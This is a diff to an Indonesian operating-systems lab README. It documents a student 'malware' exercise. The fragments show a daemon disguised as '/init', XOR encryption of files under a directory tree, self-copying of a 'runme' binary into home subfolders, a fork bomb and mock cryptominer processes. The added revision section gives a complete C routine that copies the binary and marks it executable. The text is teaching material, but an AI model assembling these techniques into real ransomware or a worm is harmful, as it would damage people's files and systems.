@@ -22,7 +22,7 @@ Malware ini berjalan berulang setiap 30 detik, dan hanya `runme` yang benar-bena
 
 ---
 
-### Subsoal a : Daemon dan Rename Proses
+### A : Daemon dan Rename Proses
 ```c
 daemonize();
 prctl(PR_SET_NAME, "/init", 0, 0, 0);
@@ -33,7 +33,7 @@ prctl(PR_SET_NAME, "/init", 0, 0, 0);
 
 ---
 
-### Subsoal b : Enkripsi oleh `wannacryptor`
+### B : Enkripsi oleh `wannacryptor`
 ```c
 void xor_file(const char *filepath, unsigned char key) {
     FILE *fp = fopen(filepath, "rb+");
@@ -58,7 +58,7 @@ wannacryptor(root_path, key);
 
 ---
 
-### Subsoal c : Penyebaran Malware oleh `trojan.wrm`
+### C : Penyebaran Malware oleh `trojan.wrm`
 ```c
 void spread_malware(const char *self_path) {
     ...
@@ -76,7 +76,7 @@ void spread_malware(const char *self_path) {
 
 ---
 
-### Subsoal d : Looping 30 Detik
+### D : Looping 30 Detik
 ```c
 while (1) {
     ...
@@ -90,7 +90,7 @@ while (1) {
 
 ---
 
-### Subsoal e & f : Fork Bomb & Cryptomining oleh `rodok.exe`
+### E & F : Fork Bomb & Cryptomining oleh `rodok.exe`
 ```c
 void spawn_miners() {
     for (int i = 0; i < 4; i++) {
@@ -123,7 +123,7 @@ if (fork() == 0) {
 
 ---
 
-### Subsoal g : Logging Hash Cryptominer
+### G : Logging Hash Cryptominer
 **Contoh Log :**
 ```c
 [2025-04-10 17:32:05][Miner 00] d1f4c93aa8dabc17e9a4...
@@ -140,5 +140,58 @@ if (fork() == 0) {
 - rodok.exe adalah parent dari semua proses mine-crafter-XX.
 - Karena rodok.exe menjalankan pause(), prosesnya tetap hidup dan menjaga anak-anaknya.
 - Jika rodok.exe dihentikan (kill), maka semua mine-crafter juga akan mati.
+
+---
+
+### ❕REVISI❕
+---
+### 1. Penyebaran ***runme*** ke direktori ***home/user***
+### 🔻 Sebelumnya:
+Kode hanya menyebar ke folder di dalam /home/user, lewat loop:
+```c
+DIR *dir = opendir("/home/user");
+while ((entry = readdir(dir)) != NULL) {
+    ...
+    if (S_ISDIR(st.st_mode)) {
+        snprintf(dest, sizeof(dest), "%s/runme", path);
+        ...
+        fwrite(...);  // salin file runme
+        spread_malware(path, self_path); // rekursif
+    }
+}
+```
+### ✅ Sesudah :
+```c
+struct stat st;
+if (stat(base_path, &st) == 0 && S_ISDIR(st.st_mode)) {
+    char dest[MAX_PATH];
+    snprintf(dest, sizeof(dest), "%s/runme", base_path);
+
+    FILE *src = fopen(self_path, "rb");
+    FILE *dst = fopen(dest, "wb");
+    if (src && dst) {
+        char buf[1024];
+        size_t n;
+        while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
+            fwrite(buf, 1, n, dst);
+        fclose(src);
+        fclose(dst);
+        chmod(dest, 0755);
+    }
+}
+```
+Bagian ini akan selalu menyalin **runme** ke folder **base_path** saat fungsi dipanggil, termasuk **/home/user**.
+
+### Setelah malware dijalankan :
+```
+/home/user/
+├── runme               ← disalin ke direktori ini
+├── Documents/
+│   └── runme
+├── Downloads/
+│   └── runme
+├── Pictures/
+│   └── runme
+```
 
 # Soal_4
